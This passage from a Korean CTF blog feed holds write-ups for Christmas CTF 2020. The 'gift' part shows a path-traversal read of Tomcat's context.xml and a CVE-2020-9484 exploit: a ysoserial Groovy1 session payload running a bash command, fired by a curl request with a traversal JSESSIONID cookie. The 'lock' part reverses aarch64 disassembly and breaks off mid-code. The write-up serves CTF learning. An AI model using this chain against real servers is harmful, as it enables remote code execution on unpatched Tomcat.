src="/2020/12/29/idioth/christmasctf2020-gift/image10.png"></p><p><code>special.jsp</code>ë¼ëŠ” íŒŒì¼ì´ ìˆë„¤ìš”. ë©”ì¸ì—ì„œ special giftê°€ ìˆ¨ê²¨ì ¸ ìˆë‹¤ê³  í–ˆìœ¼ë‹ˆ í•´ë‹¹ jspë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image11.png"></p><p><code>special_gift</code> íŒŒì¼ì„ ì°¾ì•„ì„œ ì‹¤í–‰í•˜ë©´ ì´ ë””ë ‰í„°ë¦¬ì—ì„œ íŠ¹ë³„í•œ ì„ ë¬¼ì„ ë³¼ ìˆ˜ ìˆë‹¤ê³  í•©ë‹ˆë‹¤.</p><p>tomcat ë””ë ‰í„°ë¦¬ë¡œ ê°€ì„œ RELEASE-NOTESì˜ ë‚´ìš©ì„ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image12.png"></p><p>tomcat-8.5.54 ë²„ì „ì—ì„œ ë™ì‘í•˜ê³  ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ë²„ì „ì€ CVE-2020-9484 ë²„ì „ì— ì˜í–¥ì„ ë°›ëŠ” ë²„ì „ì´ê³  í•´ë‹¹ ì·¨ì•½ì ì— ì˜í–¥ì„ ë°›ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë°©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>tomcatì´ sessionì„ PersistenceManagerë¥¼ í†µí•´ ì„¸ì…˜ì„ ê´€ë¦¬í•¨</li><li>FileStoreë¥¼ í†µí•´ Directory ê²½ë¡œë¥¼ ì§€ì •í•¨</li><li>arbitrary file uploadê°€ ê°€ëŠ¥í•˜ë©° í•´ë‹¹ íŒŒì¼ì´ ì–´ë””ì— ì €ì¥ë˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆìŒ</li></ul><p>í˜„ì¬ arbitrary file uploadê°€ ê°€ëŠ¥í•˜ë©° íŒŒì¼ì´ ì—…ë¡œë“œë˜ëŠ” ìœ„ì¹˜ë„ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ <code>conf/context.xml</code>ì„ í†µí•´ PersistenceManagerë¥¼ ì‚¬ìš© ì¤‘ì¸ì§€, ì‚¬ìš© ì¤‘ì´ë¼ë©´ FileStoreë¡œ Directoryë¥¼ ì§€ì •í•´ì„œ ì €ì¥í•˜ëŠ”ì§€, ì €ì¥í•œë‹¤ë©´ sessionì´ ì €ì¥ë˜ëŠ” ê²½ë¡œëŠ” ì–´ë”˜ì§€ í™•ì¸í•©ì‹œë‹¤.(ì•„ê¹Œ ìœ„ì—ì„œ sessions í´ë”ë¥¼ ë³¸ ê²ƒ ê°™ê¸´ í•œë°)</p><p><code>detail.jsp?file=..././..././..././conf/context.xml</code>ë¡œ ì ‘ê·¼í•˜ë©´ <code>conf/context.xml</code>ì˜ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image13.png"></p><p>PersistentManager, FileStoreë¥¼ ì‚¬ìš©í•˜ë©° sessionì´ ì €ì¥ë˜ëŠ” ê²½ë¡œëŠ” <code>/usr/local/tomcat/sessions</code>ë„¤ìš”.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ sessionì„ deserialize í•˜ë©´ì„œ ì¼ì–´ë‚˜ëŠ” ì·¨ì•½ì ì´ë¯€ë¡œ gadgetë„ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image14.png"></p><p><code>/lib</code> í´ë”ì— <code>groovy-2.3.9.jar</code> ê°€ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ì œ <code>special_gift</code> íŒŒì¼ì˜ ìœ„ì¹˜ë¥¼ ì°¾ì•„ë³´ë©´</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image15.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image16.png"></p><p>ìµœìƒìœ„ ê²½ë¡œì— ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.(ì´ê²ƒë„ ìœ„ì¹˜ë¥¼ ì•Œë ¤ì¤¬ì–´ì•¼â€¦ã… ã… ) ì´ì œ í•´ë‹¹ ì·¨ì•½ì ì„ í™œìš©í•˜ì—¬ <code>special_gift</code> ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ <code>/webapps/ROOT</code> ì— flag íŒŒì¼ì´ ìƒì„±ë  ê²ƒì…ë‹ˆë‹¤.</p><p>ê·¸ì „ì— í•´ë‹¹ ì·¨ì•½ì ì„ í™œìš©í•˜ëŠ” ê²ƒì´ ë§ëŠ”ì§€ upload.jspì˜ ë‚´ìš©ìœ¼ë¡œ ì˜¬ë¦´ ìˆ˜ ìˆëŠ” special fileì´ session íŒŒì¼ì¸ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image17.png"></p><p>í—ˆìš©ë˜ì–´ìˆëŠ” í™•ì¥ìê°€ <code>.txt</code>ì™€ <code>.session</code>íŒŒì¼ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image18.png"></p><p>í .. ì¼ë‹¨ exploit ê³¼ì •ì„ ì •ë¦¬í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>fileì´ ì—…ë¡œë“œë˜ëŠ” ê²½ë¡œëŠ” <code>tomcat/media/gift/&lt;name&gt;</code>ì´ë‹¤.</li><li>sessionsì´ ì €ì¥ë˜ëŠ” ê²½ë¡œëŠ” <code>tomcat/sessions</code>ì´ë‹¤.</li><li><code>special.jsp</code> ì— ë”°ë¥´ë©´ <code>/special_gift</code>ë¥¼ ì‹¤í–‰í•˜ë©´ flag íŒŒì¼ì´ ìƒì„±ëœë‹¤.</li><li><code>/bin/bash -c /special_gift</code>ë¥¼ ìˆ˜í–‰í•˜ë©´ <code>special_gift</code> íŒŒì¼ì´ ì‹¤í–‰ë˜ê³  flagë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li><li>serialize session ìƒì„±</li></ul><pre><code class="hljs pgsql">idioth@ubuntu:~$ java -jar ysoserial.jar Groovy1 &quot;/bin/bash -c /special_gift&quot; &gt; exploit.<span class="hljs-keyword">session</span><span class="hljs-built_in">WARNING</span>: An illegal reflective <span class="hljs-keyword">access</span> operation has occurred<span class="hljs-built_in">WARNING</span>: Illegal reflective <span class="hljs-keyword">access</span> <span class="hljs-keyword">by</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span> (file:/home/idioth/ysoserial.jar) <span class="hljs-keyword">to</span> <span class="hljs-keyword">method</span> java.lang.<span class="hljs-keyword">Object</span>.finalize()<span class="hljs-built_in">WARNING</span>: Please consider reporting this <span class="hljs-keyword">to</span> the maintainers <span class="hljs-keyword">of</span> org.codehaus.groovy.reflection.CachedClass<span class="hljs-meta">$3</span><span class="hljs-meta">$1</span><span class="hljs-built_in">WARNING</span>: Use <span class="hljs-comment">--illegal-access=warn to enable warnings of further illegal reflective access operations</span><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">All</span> illegal <span class="hljs-keyword">access</span> operations will be denied <span class="hljs-keyword">in</span> a future <span class="hljs-keyword">release</span></code></pre><ul><li>í•´ë‹¹ session fileìœ¼ë¡œ ì ‘ê·¼</li></ul><pre><code class="hljs xml">idioth@ubuntu:~$ curl &#x27;http://192.168.48.128/index.jsp&#x27; -H &#x27;Cookie:JSESSIONID=../media/gift/test/exploit&#x27;<span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTTP Status 500 â€“ Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">font-family</span>:Tahoma,Arial,sans-serif;&#125; <span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">b</span> &#123;<span class="hljs-attribute">color</span>:white;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;&#125; <span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">22px</span>;&#125; <span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">16px</span>;&#125; <span class="hljs-selector-tag">h3</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125; <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">12px</span>;&#125; <span class="hljs-selector-tag">a</span> &#123;<span class="hljs-attribute">color</span>:black;&#125; <span class="hljs-selector-class">.line</span> &#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">1px</span>;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;<span class="hljs-attribute">border</span>:none;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTTP Status 500 â€“ Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image19.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image20.png"></p><p>XMAS{0mg_u_f1nd_a_sp3cia1_g1ft!!}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>tomcat</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>web</tag>
      
      <tag>lfi</tag>
      
      <tag>cve-2020-9484</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - lock</title>
    <link href="/2020/12/29/idioth/christmasctf2020-lock/"/>
    <url>/2020/12/29/idioth/christmasctf2020-lock/</url>
    
    <content type="html"><![CDATA[<h1 id="ì¶œì œ-ì˜ë„"><a href="#ì¶œì œ-ì˜ë„" class="headerlink" title="ì¶œì œ ì˜ë„"></a>ì¶œì œ ì˜ë„</h1><p>baby_crackmeë¥¼ í•˜ë‚˜ ê°„ë‹¨í•˜ê²Œ ë‚´ê³  ì‹¶ì—ˆëŠ”ë° armìœ¼ë¡œ ë‚´ë©´ ì–´ë–¨ê¹Œ? ì‹¶ì–´ì„œ ë‚¸ ë¬¸ì œì…ë‹ˆë‹¤.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>dumpë¡œ íŒŒì¼ì´ í•˜ë‚˜ ì£¼ì–´ì§€ë©° vscodeë‚˜ ë©”ëª¨ì¥ ë“±ìœ¼ë¡œ ì—´ë©´ ì•„ë˜ì™€ ê°™ì€ dump ì½”ë“œê°€ ë‚˜ì˜µë‹ˆë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-lock/image0.png"></p><p>aarch64ì—ì„œ ë™ì‘í•˜ëŠ” ë°”ì´ë„ˆë¦¬ì´ë©° Input ê°’ì„ í†µí•´ ì–´ë– í•œ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs llvm"><span class="hljs-number">0000000000000</span><span class="hljs-keyword">c</span><span class="hljs-number">50</span> &lt;main&gt;: <span class="hljs-keyword">c</span><span class="hljs-number">50</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp, #<span class="hljs-number">-32</span>]! <span class="hljs-keyword">c</span><span class="hljs-number">54</span>:   <span class="hljs-number">910003</span>fd    mov <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, sp <span class="hljs-keyword">c</span><span class="hljs-number">58</span>:   d<span class="hljs-number">2800021</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span> Â  Â  Â  Â  Â  Â  Â  Â  Â   // <span class="hljs-symbol">#1</span> <span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span>:   d<span class="hljs-number">2800260</span>    mov <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">13</span> Â  Â  Â  Â  Â  Â  Â  Â    // <span class="hljs-symbol">#19</span> <span class="hljs-keyword">c</span><span class="hljs-number">60</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">0</span>    bl  <span class="hljs-number">7e0</span> &lt;calloc<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">64</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">68</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">94</span>    bl  ab<span class="hljs-number">8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">51</span>    bl  <span class="hljs-number">9</span>b<span class="hljs-number">0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">70</span>:   f<span class="hljs-number">9000</span>fe<span class="hljs-number">0</span>    str <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">74</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>e    bl  <span class="hljs-number">96</span><span class="hljs-keyword">c</span> &lt;sub_<span class="hljs-number">96</span><span class="hljs-keyword">c</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">78</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">7</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">90000000</span>    adrp    <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-number">0</span> &lt;_init<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">760</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">80</span>:   <span class="hljs-number">9138</span>a<span class="hljs-number">000</span>    <span class="hljs-keyword">add</span> <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span> Â  Â  Â  Â  Â  Â   // <span class="hljs-symbol">#0</span>xe<span class="hljs-number">28</span> &#x27;<span class="hljs-symbol">%s</span>&#x27; <span class="hljs-keyword">c</span><span class="hljs-number">84</span>:   <span class="hljs-number">97</span>fffeeb    bl  <span class="hljs-number">830</span> &lt;__isoc<span class="hljs-number">99</span>_scanf<span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">88</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">1</span>, [sp, <span class="hljs-symbol">#24</span>] <span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">90</span>:   <span class="hljs-number">97</span>ffffa<span class="hljs-number">8</span>    bl  b<span class="hljs-number">30</span> &lt;sub_b<span class="hljs-number">30</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">94</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr <span class="hljs-keyword">x</span><span class="hljs-number">0</span>, [sp, <span class="hljs-symbol">#16</span>] <span class="hljs-keyword">c</span><span class="hljs-number">98</span>:   <span class="hljs-number">97</span>fffee<span class="hljs-number">2</span>    bl  <span class="hljs-number">820</span> &lt;<span class="hljs-keyword">free</span><span class="hljs-title">@plt</span>&gt; <span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-keyword">c</span>:   <span class="hljs-number">52800000</span>    mov w<span class="hljs-number">0</span>, <span class="hljs-symbol">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">0</span> Â  Â  Â  Â  Â  Â  Â  Â  Â   // <span class="hljs-symbol">#0</span> ca<span class="hljs-number">0</span>:   a<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">27</span>bfd    ldp <span class="hljs-keyword">x</span><span class="hljs-number">29</span>, <span class="hljs-keyword">x</span><span class="hljs-number">30</span>, [sp], <span class="hljs-symbol">#32</span> ca<span class="hljs-number">4</span>:   d<span class="hljs-number">65</span>f<span class="hljs-number">03</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>    <span class="hljs-keyword">ret</span></code></pre><p>main í•¨ìˆ˜ë¥¼ ë³´ë©´ <code>sp + #16</code>ì— calloc(0x13,1)ì„ í•´ì£¼ê³  <code>sub_ab8</code>í•¨ìˆ˜ê°€ í˜¸ì¶œëœ í›„ ë‚˜ì˜¨ ê°’ì„ ì¸ìë¡œ <code>sub_9b0</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ëœ í›„ <code>sp + #24</code>ì— ì €ì¥í•©ë‹ˆë‹¤. ê·¸ í›„ <code>sub_96c</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ê°’ì„ ë°›ì•„ì„œ<code>sp+#16</code>ì— ë„£ì–´ì£¼ê³   <code>sub_9b0(sub_ab8())</code> í•œ ê°’ê³¼ input ê°’ì„ ì¸ìë¡œ <code>sub_b30</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œë©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ë¥¼ c ì½”ë“œë¡œ ê°„ë‹¨í•˜ê²Œ ë‚˜íƒ€ë‚´ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123; Â  Â <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>); Â  Â <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8()); Â  Â sub_96c(); Â  Â <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1); Â  Â sub_b30(var1, var2); Â  Â <span class="hljs-built_in">free</span>(var1); Â  Â <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>sub_ab8</code>ê³¼ <code>sub_9b0</code> í•¨ìˆ˜ë¥¼ ì‚´í´ë´…ì‹œë‹¤.</p><pre><code class="hljs apache"><span class="hljs-attribute">value0</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">96</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">99</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span><span class="hljs-attribute">value1</span>  DCB <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">64</span>, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>xFC, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>, <span class="hljs-number">0</span>x<span class="hljs-number">79</span>, <span class="hljs-number">0</span>xFF,<span class="hljs-attribute">0x73</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>D, <span class="hljs-number">0</span>xF<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">61</span>, <span class="hljs-number">0</span>xE<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">74</span>, <span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-attribute">0xEC</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">75</span>, <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>xEF, <span class="hljs-number">0</span>x<span class="hljs-number">63</span>, <span class="hljs-number">0</span>x<span class="hljs-number">46</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>xDA, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>,<span class="hljs-attribute">0x57</span>, <span class="hljs-number">0</span>xD<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">51</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>xD<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>xD<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">49</span>, <span class="hljs-number">0</span>x<span class="hljs-number">56</span>,<span class="hljs-attribute">0x43</span>, <span class="hljs-number">0</span>xCA, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">57</span>, <span class="hljs-number">0</span>x<span class="hljs-number">47</span>, <span class="hljs-number">0</span>xC<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">41</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">4</span>B, <span class="hljs-number">0</span>xA<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x<span class="hljs-number">28</span>, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>,<span class="hljs-attribute">0x22</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">31</span>, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>, <span class="hljs-number">0</span>xA<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span><span class="hljs-attribute">0000000000000ab8</span> &lt;sub_ab<span class="hljs-number">8</span>&gt;: <span class="hljs-attribute">ab8</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> abc:   910003fd    mov x29, sp</span><span class="hljs-meta"> ac0:   52800103    mov w3, #0x8 Â  Â  Â  Â  Â  Â  Â  Â  Â   // #8</span><span class="hljs-meta"> ac4:   90000000    adrp    x0, value0@page</span><span class="hljs-meta"> ac8:   9136e002    add x2, x0, value0@pageoff</span><span class="hljs-meta"> acc:   528007c1    mov w1, #0x3e Â  Â  Â  Â  Â  Â  Â  Â    // #62</span><span class="hljs-meta"> ad0:   90000000    adrp    x0, value1@page</span><span class="hljs-meta"> ad4:   91372000    add x0, x0, value1@pageoff</span><span class="hljs-meta"> ad8:   97ffffc9    bl  9fc &lt;sub_9fc&gt;</span><span class="hljs-meta"> adc:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">ae0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ae4</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> ae8:   d65f03c0    ret</span></code></pre><p>aarch64ì˜ calling conventionì€ <code>x0</code>, <code>x1</code>, <code>x2</code>, <code>x3</code> ì´ë¯€ë¡œ ì¸ìì— value1, 0x3e, value0, 0x8ì„ ë„£ì–´ <code>sub_9fc</code>ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. í˜¸ì¶œí•˜ê³  ë‚œ í›„ ì—°ì‚°ëœ ë¬¸ìì—´ì„ return í•´ì¤ë‹ˆë‹¤.</p><pre><code class="hljs apache"><span class="hljs-attribute">00000000000009b0</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>&gt;: <span class="hljs-attribute">9b0</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> 9b4:   910003fd    mov x29, sp</span><span class="hljs-meta"> 9b8:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">9bc</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9c0</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">78</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">9c4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">9c8</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">7</span>e    bl  <span class="hljs-number">7</span>c<span class="hljs-number">0</span> &lt;malloc@plt&gt; <span class="hljs-attribute">9cc</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d0</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">9d4</span>:   f<span class="hljs-number">100001</span>f    cmp x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span> <span class="hljs-attribute">9d8</span>:   <span class="hljs-number">54000061</span>    b.ne    <span class="hljs-number">9</span>e<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">34</span>&gt;  // b.any <span class="hljs-attribute">9dc</span>:   d<span class="hljs-number">2800000</span>    mov x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span> Â  Â  Â  Â  Â  Â  Â   // #<span class="hljs-number">0</span> <span class="hljs-attribute">9e0</span>:   <span class="hljs-number">14000005</span>    b   <span class="hljs-number">9</span>f<span class="hljs-number">4</span> &lt;sub_<span class="hljs-number">9</span>b<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt; <span class="hljs-attribute">9e4</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">1</span>    ldr x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">9e8</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span 